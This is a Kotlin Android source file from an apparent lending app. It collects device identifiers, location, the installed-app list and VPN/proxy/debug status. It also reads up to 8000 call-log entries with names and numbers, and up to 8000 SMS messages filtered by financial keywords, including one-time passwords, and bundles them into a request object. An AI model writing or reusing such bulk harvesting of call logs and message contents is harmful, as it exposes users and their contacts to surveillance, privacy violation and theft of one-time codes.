package com.demo.creditlimit.network.manager

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.provider.CallLog
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.text.format.Formatter
import androidx.annotation.WorkerThread
import com.demo.creditlimit.BuildConfig
import com.demo.creditlimit.network.model.request2.DIApplication
import com.demo.creditlimit.network.model.request2.DIBatteryStatus
import com.demo.creditlimit.network.model.request2.DICallLog
import com.demo.creditlimit.network.model.request2.DIGeneralData
import com.demo.creditlimit.network.model.request2.DIHardware
import com.demo.creditlimit.network.model.request2.DILocation
import com.demo.creditlimit.network.model.request2.DINetwork
import com.demo.creditlimit.network.model.request2.DISms
import com.demo.creditlimit.network.model.request2.DIStorage
import com.demo.creditlimit.network.model.request2.DeviceDetails
import com.demo.creditlimit.network.model.request2.GPS
import com.demo.creditlimit.network.model.request2.RuntimeReq
import com.google.gson.Gson
import java.util.Locale
import java.util.TimeZone
import kotlin.math.sqrt

internal object DeviceInfoCollector {

    private val gson = Gson()

    @WorkerThread
    fun collect(context: Context, gaid: String): RuntimeReq {
        val app = context.applicationContext
        val details = DeviceDetails().apply {
            hardware = gson.toJson(collectHardware(app))
            storage = gson.toJson(collectStorage(app))
            generalData = gson.toJson(collectGeneralData(app, gaid))
            batteryStatus = gson.toJson(collectBattery(app))
            network = gson.toJson(collectNetwork(app))
            location = gson.toJson(collectLocation(app))
            application = gson.toJson(collectAppList(app))
            sms = gson.toJson(collectSms(app))
            callLog = gson.toJson(collectCallLog(app))
            contact = "[]"
            publicIp = ""
            otherData = "{}"
            albs = "{}"
            buildId = BuildConfig.VERSION_CODE.toString()
            buildName = BuildConfig.VERSION_NAME
            packageName = app.packageName
        }
        return RuntimeReq().apply {
            deviceDetails = details
            adID = ""
            adConversionData = ""
            appInstanceID = ""
            xtRisk = ""
            contact = ""
            afId = ""
            fbc = ""
            fbp = ""
            gclid = ""
            conversionData = ""
            addressList = emptyList()
        }
    }

    // ── Hardware ─────────────────────────────────────────────────────────────

    private fun collectHardware(context: Context): DIHardware = runCatching {
        val dm = context.resources.displayMetrics
        val widthInch = dm.widthPixels / dm.xdpi
        val heightInch = dm.heightPixels / dm.ydpi
        val diagonal = sqrt((widthInch * widthInch + heightInch * heightInch).toDouble())
        DIHardware().apply {
            device_name = Build.DEVICE ?: ""
            release = Build.VERSION.RELEASE ?: ""
            sdk_version = Build.VERSION.SDK_INT
            model = Build.MODEL ?: ""
            brand = Build.BRAND ?: ""
            physical_size = String.format("%.1f", diagonal)
            serial_number = ""
            production_date = 0
            device_width = dm.widthPixels
            device_height = dm.heightPixels
            board = Build.BOARD ?: ""
        }
    }.getOrElse { DIHardware() }

    // ── Storage ──────────────────────────────────────────────────────────────

    private fun collectStorage(context: Context): DIStorage = runCatching {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo().also { am.getMemoryInfo(it) }

        val intStat = StatFs(Environment.getDataDirectory().path)
        val intTotal = intStat.blockCountLong * intStat.blockSizeLong
        val intUsable = intStat.availableBlocksLong * intStat.blockSizeLong

        val hasExt = Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED
        val extTotal: Long
        val extUsable: Long
        if (hasExt) {
            val extStat = StatFs(Environment.getExternalStorageDirectory().path)
            extTotal = extStat.blockCountLong * extStat.blockSizeLong
            extUsable = extStat.availableBlocksLong * extStat.blockSizeLong
        } else {
            extTotal = 0L; extUsable = 0L
        }

        DIStorage().apply {
            ram_total_size = memInfo.totalMem.toString()
            ram_usable_size = memInfo.availMem.toString()
            internal_storage_total = intTotal.toString()
            internal_storage_usable = intUsable.toString()
            memory_card_size = extTotal.toString()
            memory_card_usable_size = extUsable.toString()
            memory_card_size_use = (extTotal - extUsable).toString()
            contain_sd = if (hasExt) 1 else 0
            extra_sd = 0
        }
    }.getOrElse { DIStorage() }

    // ── General data ─────────────────────────────────────────────────────────

    private fun collectGeneralData(context: Context, gaid: String): DIGeneralData = runCatching {
        val locale = Locale.getDefault()
        val andId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val netType = resolveNetworkType(cm)

        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val operatorName = runCatching { tm.networkOperatorName ?: "" }.getOrElse { "" }

        val isUsbDebug = Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1
        val isProxy = System.getProperty("http.proxyHost").isNullOrBlank().not()
        val isVpn = runCatching {
            val caps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cm.getNetworkCapabilities(cm.activeNetwork)
            } else null
            caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true
        }.getOrElse { false }

        DIGeneralData().apply {
            this.gaid = gaid
            and_id = andId
            language = locale.language
            locale_iso_3_language = runCatching { locale.isO3Language }.getOrElse { "" }
            locale_display_language = locale.displayLanguage
            locale_iso_3_country = runCatching { locale.isO3Country }.getOrElse { "" }
            time_zone_id = TimeZone.getDefault().id
            imei = ""
            mac = ""
            phone_type = ""
            phone_number = ""
            network_operator_name = operatorName
            network_type = netType
            is_usb_debug = isUsbDebug
            is_using_proxy_port = isProxy
            is_using_vpn = isVpn
            elapsedRealtime = SystemClock.elapsedRealtime()
            currentSystemTime = System.currentTimeMillis()
            uptimeMillis = SystemClock.uptimeMillis()
        }
    }.getOrElse { DIGeneralData().apply { this.gaid = gaid; and_id = ""; network_type = "none" } }

    private fun resolveNetworkType(cm: ConnectivityManager): String = runCatching {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val caps = cm.getNetworkCapabilities(cm.activeNetwork) ?: return "none"
            when {
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                    val bw = caps.linkDownstreamBandwidthKbps
                    when {
                        bw >= 50_000 -> "5g"
                        bw >= 10_000 -> "4g"
                        bw >= 1_000 -> "3g"
                        else -> "2g"
                    }
                }
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "wifi"
                !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) -> "none"
                else -> "other"
            }
        } else {
            @Suppress("DEPRECATION")
            val info = cm.activeNetworkInfo
            when {
                info == null || !info.isConnected -> "none"
                info.type == ConnectivityManager.TYPE_WIFI -> "wifi"
                else -> "other"
            }
        }
    }.getOrElse { "none" }

    // ── Battery ──────────────────────────────────────────────────────────────

    private fun collectBattery(context: Context): DIBatteryStatus = runCatching {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
        DIBatteryStatus().apply {
            battery_pct = pct
            is_charging = if (plugged != 0) 1 else 0
            is_usb_charge = if (plugged == BatteryManager.BATTERY_PLUGGED_USB) 1 else 0
            is_ac_charge = if (plugged == BatteryManager.BATTERY_PLUGGED_AC) 1 else 0
        }
    }.getOrElse { DIBatteryStatus() }

    // ── Network ──────────────────────────────────────────────────────────────

    private fun collectNetwork(context: Context): DINetwork = runCatching {
        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val ip = Formatter.formatIpAddress(wm.dhcpInfo.ipAddress)
        DINetwork().apply { IP = ip }
    }.getOrElse { DINetwork().apply { IP = "" } }

    // ── Location ─────────────────────────────────────────────────────────────

    private fun collectLocation(context: Context): DILocation = runCatching {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val loc = runCatching {
            lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        }.getOrNull()

        val prefs = context.getSharedPreferences("di_location", Context.MODE_PRIVATE)
        val lat: String
        val lng: String
        if (loc != null) {
            lat = loc.latitude.toString(); lng = loc.longitude.toString()
            prefs.edit().putString("lat", lat).putString("lng", lng).apply()
        } else {
            lat = prefs.getString("lat", "") ?: ""
            lng = prefs.getString("lng", "") ?: ""
        }

        DILocation().apply {
            gps = GPS().apply { latitude = lat; longitude = lng }
            gps_address_city = ""
            gps_address_province = ""
            gps_address_street = ""
        }
    }.getOrElse { DILocation().apply { gps = GPS().apply { latitude = ""; longitude = "" } } }

    // ── App list ─────────────────────────────────────────────────────────────

    private fun collectAppList(context: Context): List<DIApplication> = runCatching {
        val pm = context.packageManager
        val flags = PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
        pm.getInstalledPackages(flags).map { pkg ->
            val appInfo = pkg.applicationInfo
            DIApplication().apply {
                app_name = runCatching { appInfo?.loadLabel(pm)?.toString() ?: "" }.getOrElse { "" }
                package_ = pkg.packageName ?: ""
                in_time = pkg.firstInstallTime
                up_time = pkg.lastUpdateTime
                version_name = pkg.versionName ?: ""
                version_code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    pkg.longVersionCode.toInt()
                } else {
                    @Suppress("DEPRECATION") pkg.versionCode
                }
                val appFlags = appInfo?.flags ?: 0
                this.flags = appFlags
                app_type = if (appFlags and ApplicationInfo.FLAG_SYSTEM != 0) 1 else 0
            }
        }
    }.getOrElse { emptyList() }

    // ── SMS ──────────────────────────────────────────────────────────────────

    private val SMS_KEYWORDS_EN = listOf(
        "loan", "credit", "repayment", "repay", "emi", "nbfc", "bank", "interest",
        "overdue", "due", "limit", "finance", "financial", "kredit", "collection",
        "pay now", "transaction", "otp", "upi", "debit", "credit card"
    )
    private val SMS_KEYWORDS_HI = listOf(
        "ऋण", "कर्ज", "लोन", "भुगतान", "ब्याज", "वसूली", "किस्त", "ईएमआई",
        "देय", "बैंक", "क्रेडिट", "ओटीपी", "खाता"
    )

    private fun isFinancialSms(address: String, body: String): Boolean {
        val text = (address + " " + body).lowercase()
        return SMS_KEYWORDS_EN.any { text.contains(it) } || SMS_KEYWORDS_HI.any { text.contains(it) }
    }

    private fun collectSms(context: Context): List<DISms> = runCatching {
        val result = mutableListOf<DISms>()
        val projection = arrayOf("_id", "address", "body", "date", "type", "date_sent", "read", "seen", "status", "person")
        context.contentResolver.query(
            Telephony.Sms.CONTENT_URI, projection, null, null, "date DESC"
        )?.use { cursor ->
            val iId = cursor.getColumnIndex("_id")
            val iAddr = cursor.getColumnIndex("address")
            val iBody = cursor.getColumnIndex("body")
            val iDate = cursor.getColumnIndex("date")
            val iType = cursor.getColumnIndex("type")
            val iSent = cursor.getColumnIndex("date_sent")
            val iRead = cursor.getColumnIndex("read")
            val iSeen = cursor.getColumnIndex("seen")
            val iStatus = cursor.getColumnIndex("status")
            val iPerson = cursor.getColumnIndex("person")
            while (cursor.moveToNext() && result.size < 8000) {
                val addr = cursor.getString(iAddr) ?: ""
                val body = cursor.getString(iBody) ?: ""
                if (isFinancialSms(addr, body)) {
                    result.add(DISms().apply {
                        msg_id = cursor.getLong(iId)
                        phone = addr; content = body
                        time = cursor.getLong(iDate)
                        type = cursor.getInt(iType)
                        date_sent = cursor.getLong(iSent)
                        read = cursor.getInt(iRead)
                        seen = cursor.getInt(iSeen)
                        status = cursor.getInt(iStatus)
                        person = cursor.getInt(iPerson)
                        sms_crawl_time = System.currentTimeMillis()
                        user_gid = ""
                    })
                }
            }
        }
        result
    }.getOrElse { emptyList() }

    // ── Call log ─────────────────────────────────────────────────────────────

    private fun collectCallLog(context: Context): List<DICallLog> = runCatching {
        val result = mutableListOf<DICallLog>()
        val projection = arrayOf("_id", "type", "name", "number", "date", "duration", "countryiso")
        context.contentResolver.query(
            CallLog.Calls.CONTENT_URI, projection, null, null, "date DESC"
        )?.use { cursor ->
            val iId = cursor.getColumnIndex("_id")
            val iType = cursor.getColumnIndex("type")
            val iName = cursor.getColumnIndex("name")
            val iNum = cursor.getColumnIndex("number")
            val iDate = cursor.getColumnIndex("date")
            val iDur = cursor.getColumnIndex("duration")
            val iCountry = cursor.getColumnIndex("countryiso")
            while (cursor.moveToNext() && result.size < 8000) {
                result.add(DICallLog().apply {
                    id = cursor.getLong(iId)
                    type = cursor.getInt(iType)
                    name = cursor.getString(iName) ?: ""
                    number = cursor.getString(iNum) ?: ""
                    date = cursor.getLong(iDate)
                    duration = cursor.getInt(iDur)
                    countryiso = cursor.getString(iCountry) ?: ""
                })
            }
        }
        result
    }.getOrElse { emptyList() }
}
